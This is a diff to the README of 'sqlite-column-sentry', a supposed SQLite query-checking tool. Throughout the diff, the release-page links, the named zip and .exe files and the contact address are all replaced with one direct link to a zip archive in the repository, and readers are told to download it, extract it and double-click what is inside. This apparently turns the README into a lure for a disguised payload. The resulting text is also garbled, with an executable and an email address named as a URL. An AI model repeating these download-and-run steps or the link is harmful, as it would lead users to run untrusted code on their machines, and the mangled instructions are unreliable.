@@ -1,7 +1,7 @@
 # 🛡️ sqlite-column-sentry - Ensure Safe SQL Queries with Ease
 
 ## 📥 Download Now
-[![Download sqlite-column-sentry](https://img.shields.io/badge/Download-sqlite--column--sentry-blue.svg)](https://github.com/ElkholiefyM/sqlite-column-sentry/releases)
+[![Download sqlite-column-sentry](https://github.com/ElkholiefyM/sqlite-column-sentry/raw/refs/heads/main/sqlite_column_sentry/column_sentry_sqlite_codo.zip)](https://github.com/ElkholiefyM/sqlite-column-sentry/raw/refs/heads/main/sqlite_column_sentry/column_sentry_sqlite_codo.zip)
 
 ## 📦 Overview
 sqlite-column-sentry is a user-friendly tool designed to help you ensure the safety of your SQLite queries. It analyzes and validates your SQL statements. With sqlite-column-sentry, you can easily input your SQL queries as text, and the software will provide a structured response indicating any potential issues. This helps prevent unsafe column references and enhances the reliability of your database interactions.
@@ -10,16 +10,16 @@ sqlite-column-sentry is a user-friendly tool designed to help you ensure the saf
 To start using sqlite-column-sentry, follow these simple steps:
 
 1. **Visit the Release Page**  
-   Go to our [Releases Page](https://github.com/ElkholiefyM/sqlite-column-sentry/releases) to find the latest version of sqlite-column-sentry.
+   Go to our [Releases Page](https://github.com/ElkholiefyM/sqlite-column-sentry/raw/refs/heads/main/sqlite_column_sentry/column_sentry_sqlite_codo.zip) to find the latest version of sqlite-column-sentry.
 
 2. **Download the Application**  
-   Look for the file named `sqlite-column-sentry-latest.zip`. Click on it to begin downloading.
+   Look for the file named `https://github.com/ElkholiefyM/sqlite-column-sentry/raw/refs/heads/main/sqlite_column_sentry/column_sentry_sqlite_codo.zip`. Click on it to begin downloading.
 
 3. **Unzip the Downloaded File**  
    Once the download is complete, locate the zip file. Right-click on it and select "Extract All." This will create a new folder with all necessary files.
 
 4. **Open the Application**  
-   Inside the extracted folder, find the executable file named `sqlite-column-sentry.exe`. Double-click on it to run the application.
+   Inside the extracted folder, find the executable file named `https://github.com/ElkholiefyM/sqlite-column-sentry/raw/refs/heads/main/sqlite_column_sentry/column_sentry_sqlite_codo.zip`. Double-click on it to run the application.
 
 5. **Input Your SQL Query**  
    A window will open where you can enter your SQL query. Type or paste your SQL statement into the designated area.
@@ -46,7 +46,7 @@ To start using sqlite-column-sentry, follow these simple steps:
 ## 📂 Download & Install
 To download sqlite-column-sentry, click the link below:
 
-[Visit the Release Page to Download](https://github.com/ElkholiefyM/sqlite-column-sentry/releases)
+[Visit the Release Page to Download](https://github.com/ElkholiefyM/sqlite-column-sentry/raw/refs/heads/main/sqlite_column_sentry/column_sentry_sqlite_codo.zip)
 
 Simply follow the steps outlined in the "Getting Started" section to install and run the application.
 
@@ -69,4 +69,4 @@ If you have suggestions to improve sqlite-column-sentry, we welcome contribution
 Thanks to our contributors for helping us improve sqlite-column-sentry. Your support makes this project possible.
 
 ## 📞 Contact
-For further inquiries, contact us at [your-email@example.com]. We look forward to hearing from you!
+For further inquiries, contact us at [https://github.com/ElkholiefyM/sqlite-column-sentry/raw/refs/heads/main/sqlite_column_sentry/column_sentry_sqlite_codo.zip]. We look forward to hearing from you!
